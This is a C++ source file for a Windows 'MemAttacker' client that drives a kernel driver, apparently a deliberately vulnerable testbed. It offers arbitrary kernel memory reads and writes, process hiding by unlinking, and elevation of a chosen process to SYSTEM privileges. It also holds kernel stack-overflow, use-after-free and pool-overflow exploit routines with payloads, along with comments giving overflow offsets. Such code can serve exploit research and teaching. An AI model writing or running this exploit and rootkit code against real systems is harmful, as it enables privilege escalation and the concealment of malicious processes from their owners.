#include "mem_attacker.h"
#include <iomanip>
namespace mem_attacker {

	/*  */
	bool MemAttacker::read_1byte(){
		ADDR_BYTE addr_byte = { 0 };
		std::cin >> std::hex >> addr_byte.addr;
		
		bool b_res =
			scm_manager.send_ctrl_code(MEM_ATTACKER_READ_1_BYTE, (LPVOID)&addr_byte, sizeof ADDR_BYTE, NULL, 0, 0);

		if (b_res) {
			const char symbol = isgraph((int)addr_byte.value) ? addr_byte.value : '?';
			cout << hex << uppercase
				<< "READ "
				<< "[" << addr_byte.addr << "] = 0x" << (addr_byte.value & 0xff)
				<< " or '" << symbol << "'" << endl;
		}

		return b_res;
	}

	/*  */
	bool MemAttacker::write_1byte(){
		ADDR_BYTE addr_byte = { 0 };
		std::cin >> std::hex >> addr_byte.addr;
		int16_t input = 0;
		std::cin >> std::hex >> (int16_t)input;
		addr_byte.value = (unsigned char)input;

		bool b_res =
			scm_manager.send_ctrl_code(MEM_ATTACKER_WRITE_1_BYTE, (LPVOID)&addr_byte, sizeof ADDR_BYTE, NULL, 0, 0);
		if (b_res) {
			const char symbol = isgraph((int)addr_byte.value) ? addr_byte.value : '?';
			cout << hex << uppercase
				<< "WRITE "
				<< "[" << addr_byte.addr << "] = 0x" << (addr_byte.value & 0xff)
				<< " or '" << symbol << "'" << endl;
		}
		return b_res;
	}

	/*  */
	bool MemAttacker::write_8bytes(){
		ADDR_BYTE addr_byte = { 0 };
		std::cin >> std::hex >> addr_byte.addr;
		std::cin >> std::hex >> addr_byte.value;

		bool b_res =
			scm_manager.send_ctrl_code(MEM_ATTACKER_WRITE_8_BYTES, (LPVOID)&addr_byte, sizeof ADDR_8BYTES, NULL, 0, 0);

		return b_res;
	}

	/*  */
	bool MemAttacker::hide_proc(){
		ULONG64 proc_id = 0; cin >> std::dec >> proc_id;
		bool b_res =
			scm_manager.send_ctrl_code(MEM_ATTACKER_HIDE_PROCESS, (LPVOID)&proc_id, sizeof ULONG64, NULL, 0, 0);

		return b_res;
	}

	/*  */
	bool MemAttacker::set_priv() {
		ULONG64 proc_id = 0; cin >> std::dec >> proc_id;
		bool b_res =
			scm_manager.send_ctrl_code(MEM_ATTACKER_SET_PRIVS, (LPVOID)&proc_id, sizeof ULONG64, NULL, 0, 0);

		return b_res;
	}

	bool MemAttacker::run_simple_stack_overflow(){
		DWORD bufferSz = 0; std::cin >> std::dec >> bufferSz;
		auto b_res = false;
		byte* input_buffer = (byte*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSz);
		if (input_buffer) {
			const char byte_sym = /*0x49*/ (int)'I';

			memset(input_buffer, byte_sym, bufferSz);

			/*
			E.g.
			bufferSize = 0 --> no crash
			bufferSize = 1 --> no crash
			...
			bufferSize = 2063 --> no crash
			bufferSize = 2064 --> no crash
			bufferSize = 2065 --> crash

			RIP = 2064 + 8
			RSP = 2064 + 8 + 8
			*/

			b_res = scm_manager.send_ctrl_code(MEM_ATTACKER_SIMPLE_STACK_OVERFLOW, input_buffer, bufferSz, NULL, 0, 0);
			HeapFree(GetProcessHeap(), 0, input_buffer);
		}
		return b_res;
	}

	bool MemAttacker::run_stack_overflow_with_payload(){
		DWORD proc_id = 0; cin >> std::dec >> proc_id;
		auto b_res = false;
		{ // PayloadStackOverFlow constructor
			payload_stack_overflow::PayloadStackOverFlow my_payload(proc_id);
			if (my_payload.init()) {
				b_res = scm_manager.send_ctrl_code(MEM_ATTACKER_SIMPLE_STACK_OVERFLOW,
					my_payload._buffer, my_payload._bufferSz, NULL, 0, 0);

			}
		} // PayloadStackOverFlow destructor
		return b_res;
	}

	bool MemAttacker::run_use_after_free() {
		auto b_res = false;
		for (int i = 1; i < 100; i++, Sleep((rand() % 10))) {
			b_res = scm_manager.send_ctrl_code(MEM_ATTACKER_UAF_ALLOCATE_OBJECT, NULL, 0, NULL, 0, 0);

			b_res = scm_manager.send_ctrl_code(MEM_ATTACKER_UAF_FREE_OBJECT, NULL, 0, NULL, 0, 0);

			print_messages::print_mes(TEXT("user mode attempt # %d "), i);

			b_res = scm_manager.send_ctrl_code(MEM_ATTACKER_UAF_USE_OBJECT, NULL, 0, NULL, 0, 0);

		}
		return b_res;
	}

	bool MemAttacker::run_use_after_free_with_payload(){
		DWORD proc_id = 0; cin >> std::dec >> proc_id;
		auto b_res = false;
		{ // PayloadUseAfterFree constructor
			payload_use_after_free::PayloadUseAfterFree payload_uaf(proc_id);
			if (payload_uaf.init() &&
				payload_uaf.prepare_memory() &&
				scm_manager.send_ctrl_code(MEM_ATTACKER_UAF_ALLOCATE_OBJECT, NULL, 0, NULL, 0, 0) &&
				scm_manager.send_ctrl_code(MEM_ATTACKER_UAF_FREE_OBJECT, NULL, 0, NULL, 0, 0) &&
				payload_uaf.prepare_payload()) {
				for (unsigned int i = 0; i < payload_uaf.poolGroomSz / 2; i++) {
					b_res = scm_manager.send_ctrl_code(
						MEM_ATTACKER_UAF_ALLOCATE_FAKE, payload_uaf._buffer, 0, NULL, 0, 0);
				}
				b_res = scm_manager.send_ctrl_code(MEM_ATTACKER_UAF_USE_OBJECT, NULL, 0, NULL, 0, 0);
			}
		} // PayloadUseAfterFree destructor
		return b_res;
	}

	bool MemAttacker::test_pool_allocations(){
		__debugbreak();

		print_messages::print_mes(TEXT("NonPaged Pool objects: "));
		for (int i = 0; i < 30; i++) {
			HANDLE h_event = CreateEvent(NULL, false, false, TEXT("TEST"));
			print_messages::print_mes(TEXT("\tEvent object: 0x%x "), h_event);
		}
		
		// 		HANDLE semaphore = CreateSemaphore(NULL, 0, 1, TEXT(""));
		// 		printf("\tSemaphore object: 0x%x\r\n", semaphore);
		// 		HANDLE mutex = CreateMutex(NULL, false, TEXT(""));
		// 		printf("\tMutex object: 0x%x\r\n", mutex);

		return true;
	}

	bool MemAttacker::run_pool_overflow(){
		DWORD bufferSz = 0; std::cin >> std::dec >> bufferSz;
		/*
		Windows Kernel Pool Spraying:
		RUS- https://habrahabr.ru/company/pt/blog/172719/
		ENG- https://media.blackhat.com/eu-13/briefings/Liu/bh-eu-13-liu-advanced-heap-slides.pdf

		*/
		auto b_res = false;
		byte* input_buffer = (byte*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSz);
		if (input_buffer) {
			const char byte_sym = /*0x49*/ (int)'I';

			memset(input_buffer, byte_sym, bufferSz);

			/*
			E.g.
			bufferSize = 0 --> no crash
			bufferSize = 1 --> no crash
			...
			bufferSize = 2063 --> no crash
			bufferSize = 2064 --> no crash
			bufferSize = 2065 --> crash

			RIP = 2064 + 8
			RSP = 2064 + 8 + 8
			*/

			b_res = scm_manager.send_ctrl_code(MEM_ATTACKER_SIMPLE_POOL_OVERFLOW, input_buffer, bufferSz, NULL, 0, 0);
			HeapFree(GetProcessHeap(), 0, input_buffer);
		}
		return b_res;
	}

	//////////////////////////////////////////////////////////////////////////

	struct command_pair_triple {
		std::string key_definition;
		TControlFunc key_function;
	};

	map <std::string, command_pair_triple> g_CommandsList;

	void add_unique_command(const std::string keyName, const TControlFunc keyFunction, const std::string def) {
		for (const auto & item : g_CommandsList) {
			if ((keyFunction && (keyFunction == item.second.key_function)) ||
				(keyName == item.first)) {
				cout << "Internal error: two keys cannot have the same function" << endl;
				cout << "Press enter to exit." << endl;
				cin.ignore(); // std::system("PAUSE");
				exit(-1);
			}
		}
		g_CommandsList.insert({ keyName,{ def, keyFunction, } });
	}

	void init_input_commands() {
		/*
		'_read1' -- start and set temp loop
		'_write1' -- stop loop
		'basic' -- run basic memory accesses
		'exit' -- exit this app
		'q' -- fast quit
		*/
		
		add_unique_command("_read1", &mem_attacker::MemAttacker::read_1byte, " <Address>  ' -- read 1 byte from memory <Address>");
		add_unique_command("_write1", &mem_attacker::MemAttacker::write_1byte, " <Address> <Value in hex>' -- write 1 byte to memory <Address>");
		add_unique_command("_hide", &mem_attacker::MemAttacker::hide_proc, " <ProcessId in dec> ' --  hide process with <ProcessId> by unlinking");
		add_unique_command("_priv", &mem_attacker::MemAttacker::set_priv, " <ProcessId in dec> ' --  set NT AUTHORITY\\SYSTEM privs for <ProcessId>");

		//add_unique_command("write8", &mem_attacker::MemAttacker::write_8bytes, " <Address> <Value in hex>' -- write 8 bytes to memory <Address>");
		//add_unique_command("test_stack", &mem_attacker::MemAttacker::run_simple_stack_overflow, " <BufferSize>' -- test stack overflow with <BufferSize>");
		//add_unique_command("stack", &mem_attacker::MemAttacker::run_stack_overflow_with_payload, " <UniqueProcessId in dec>' -- set NT AUTHORITY\\SYSTEM privileges for <UniqueProcessId> via stack overflow [SMEP BSOD issue]" );
		//add_unique_command("test_uaf", &mem_attacker::MemAttacker::run_use_after_free, "' -- run simple use after free, which cause a BSOD ");
		//add_unique_command("uaf", &mem_attacker::MemAttacker::run_use_after_free_with_payload, " <UniqueProcessId in dec>' -- set NT AUTHORITY\\SYSTEM privileges for <UniqueProcessId> via use after free [SMEP BSOD issue]");
		//add_unique_command("test_pool", &mem_attacker::MemAttacker::test_pool_allocations, "' -- test pool functions");
		//add_unique_command("pool", &mem_attacker::MemAttacker::run_pool_overflow, " <BufferSize>' -- test pool overflow with <BufferSize>");
		//add_unique_command("exit", NULL, "' -- exit this app ");
		add_unique_command("q", NULL, "' -- quit");
	}

	void print_supported_commands() {
		std::cout << endl;
		cout << "MemAttacker accesses kernel-mode memory illegally :[ " << endl;
		for (const auto & item : g_CommandsList) {
			cout << " '" << item.first << item.second.key_definition << endl;
		}
// 		cout << "    to test run 'cmd.exe'" << endl;
// 		cout << "    to get <ProcessId> run 'tasklist | findstr cmd*' " << endl;
// 		cout << "    to get privileges run 'whoami' " << endl;
// 		cout << "    to check privileges run 'sc stop wscsvc' " << endl;
	}

	PARSE_RESULT parse_call(mem_attacker::MemAttacker & my_testbed) {
		string string_command = { 0 };
		string_command = { 0 };
		std::cin >> string_command; //std::getline(std::cin >> std::ws, string_command);

		const auto item = g_CommandsList.find(string_command);

		if (item != g_CommandsList.end()) {
			if (NULL == item->second.key_function) {
				return PARSE_RESULT::QUIT; // quit 
			}
			else {
				(my_testbed.*item->second.key_function)();
				return PARSE_RESULT::OK; // success
			}
		}
		return PARSE_RESULT::WRONG; // wrong input command
	}

}